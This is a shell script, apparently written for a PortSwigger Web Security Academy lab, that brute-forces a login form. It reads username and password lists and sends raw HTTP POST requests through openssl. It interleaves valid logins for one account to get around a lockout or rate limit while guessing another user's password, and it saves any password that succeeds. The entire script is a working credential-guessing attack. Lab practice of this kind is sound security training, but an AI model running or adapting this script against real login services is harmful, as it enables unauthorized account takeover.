#!/bin/sh
ContentLength=0;
#username=albuquerque;
i=0;
while read username
do
#	cat passwords.txt | while read password
#	do
#		echo $username, $password;
#		i=$((i+1));
#		echo $i;
#		touch $i;
#	done
	usernames[$i]=$username
#	echo ${usernames[$i]}
	i=$((i+1));
done < usernames.txt

i=0;
while read password
do
	passwords[$i]=$password
	i=$((i+1))
done < passwords.txt
ip=0;
name1=wiener;
password1=peter;
name2=carlos;
#for (( i=0; i < 100; i++ ))
#do
	for (( j=0; j < 100; j++ ))
	do
		ContentLength=$((19+${#name1}+${#password1}));
		method="POST /login HTTP/1.1\r\nHost: ac2b1fc81f3371b880b7359600e60066.web-security-academy.net\r\nContent-Length: $ContentLength\r\nCookie: session=JjhM6BtwG8EJgFemNL7JxKWoaYoBJkDn\r\n\r\nusername=${name1}&password=${password1}";
		(echo -e $method) | openssl s_client -ign_eof -connect ac2b1fc81f3371b880b7359600e60066.web-security-academy.net:443 > /dev/null
		ContentLength=$((19+${#name2}+${#passwords[$j]}));
#		ip=$((ip+1));
		method="POST /login HTTP/1.1\r\nHost: ac2b1fc81f3371b880b7359600e60066.web-security-academy.net\r\nContent-Length: $ContentLength\r\nCookie: session=JjhM6BtwG8EJgFemNL7JxKWoaYoBJkDn\r\n\r\nusername=${name2}&password=${passwords[$j]}";

		#echo $method			
		(echo -e $method) | openssl s_client -ign_eof -connect ac2b1fc81f3371b880b7359600e60066.web-security-academy.net:443 | grep "Incorrect password" > tt;
		#| grep "Invalid username or password" > tt
		echo ${name2}, ${passwords[$j]}
		cat tt
		[ ! -s tt ] && echo ${name2}, ${passwords[$j]} >> right8 && exit;		
	done
#done
